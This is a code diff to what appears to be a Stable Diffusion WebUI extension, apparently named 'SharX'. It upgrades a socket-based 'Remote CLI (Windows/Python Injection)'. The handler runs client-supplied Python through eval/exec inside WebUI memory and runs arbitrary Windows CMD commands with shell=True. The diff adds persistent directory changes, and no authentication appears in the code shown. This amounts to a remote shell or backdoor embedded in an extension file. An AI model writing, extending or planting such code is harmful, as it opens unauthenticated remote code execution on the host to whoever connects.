@@ -4,6 +4,7 @@ import subprocess
 import io
 import contextlib
 import traceback
+import os
 import modules.scripts as scripts
 
 # Preserve the SD WebUI environment variables
@@ -11,12 +12,15 @@ sharx_env = globals().copy()
 
 def handle_client(client_socket):
     welcome = (
-        "=== SharX Remote CLI (Windows/Python ) ===\n"
+        "=== SharX Remote CLI (Windows/Python Injection) ===\n"
         "-> Type raw Python to interact with WebUI memory.\n"
         "-> Prefix with 'sys:' to run Windows CMD commands (e.g., sys: dir)\n"
         "-> Type 'exit' to disconnect.\n> "
     )
     client_socket.sendall(welcome.encode('utf-8'))
+    
+    # [HACK] Track state folder secara virtual di level Python
+    virtual_cwd = os.getcwd()
     
     while True:
         try:
@@ -37,16 +41,30 @@ def handle_client(client_socket):
             if cmd.startswith("sys:"):
                 # Route to Windows CMD
                 shell_cmd = cmd[4:].strip()
-                try:
-                    result = subprocess.run(
-                        shell_cmd, 
-                        shell=True, 
-                        capture_output=True, 
-                        text=True
-                    )
-                    output = result.stdout + result.stderr
-                except Exception as e:
-                    output = f"Windows OS Error: {str(e)}\n"
+                
+                # [HACK] Cegat command 'cd' supaya state pindah folder kesimpen
+                if shell_cmd.lower().startswith("cd "):
+                    target_dir = shell_cmd[3:].strip()
+                    try:
+                        # Ganti direktori beneran di level thread ini
+                        os.chdir(target_dir)
+                        virtual_cwd = os.getcwd()
+                        output = f"[+] Directory changed to: {virtual_cwd}\n"
+                    except Exception as e:
+                        output = f"[-] Directory Error: {str(e)}\n"
+                else:
+                    try:
+                        # Eksekusi dengan CWD yang udah di-update
+                        result = subprocess.run(
+                            shell_cmd, 
+                            shell=True, 
+                            capture_output=True, 
+                            text=True,
+                            cwd=virtual_cwd
+                        )
+                        output = result.stdout + result.stderr
+                    except Exception as e:
+                        output = f"Windows OS Error: {str(e)}\n"
             else:
                 # Route to Stable Diffusion Python Memory
                 stdout_capture = io.StringIO()
@@ -54,13 +72,11 @@ def handle_client(client_socket):
                 
                 with contextlib.redirect_stdout(stdout_capture), contextlib.redirect_stderr(stderr_capture):
                     try:
-                        # Try eval for quick variable inspection
                         try:
                             res = eval(cmd, sharx_env)
                             if res is not None:
                                 print(res)
                         except SyntaxError:
-                            # Fallback to exec for complex functions/loops
                             exec(cmd, sharx_env)
                     except Exception:
                         traceback.print_exc()
@@ -70,8 +86,11 @@ def handle_client(client_socket):
             if not output.endswith("\n"):
                 output += "\n"
             
+            # Kasih indicator CWD di prompt biar berasa beneran di CMD
+            prompt = f"\n[sys:{virtual_cwd}]> " if cmd.startswith("sys:") else "\n[py]> "
+            
             client_socket.sendall(output.encode('utf-8'))
-            client_socket.sendall(b"> ")
+            client_socket.sendall(prompt.encode('utf-8'))
             
         except Exception:
             break
